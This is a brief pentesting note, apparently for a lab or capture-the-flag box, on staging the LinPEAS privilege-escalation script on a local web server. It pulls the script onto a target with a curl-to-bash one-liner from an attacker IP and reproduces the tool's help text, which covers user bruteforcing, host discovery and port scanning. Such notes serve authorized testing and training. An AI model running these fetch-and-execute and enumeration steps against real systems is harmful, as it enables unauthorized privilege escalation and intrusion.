Download LinPEAS locally, then set up a webserver locally, and curl LinPEAS from the attacking box

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

sudo python3 -m http.server 3000
```

```
curl http://10.10.14.41:3000/linpeas.sh|bash
```

LinPEAS is a script that searches for possible privilege Escalation Paths on Linux.

With LinPEAS you can also **discover hosts automatically** using `fping`, `ping` and/or `nc`, and **scan ports** using `nc`.

LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts discovery and/or port scanning.

**It's recommended to use the params `-a` and `-r` if you are looking for a complete and intensive scan**.

```
Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -t Automatic network scan & Internet conectivity checks - This option writes to files
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
	      -D Debug mode

        Network recon:
            -t Automatic network scan & Internet conectivity checks - This option writes to files
	      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
            -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
            -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding:
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a local IP to a remote IP

        Firmware recon:
            -f </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
	      -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
	      -q Do not show banner
            -N Do not use colours
```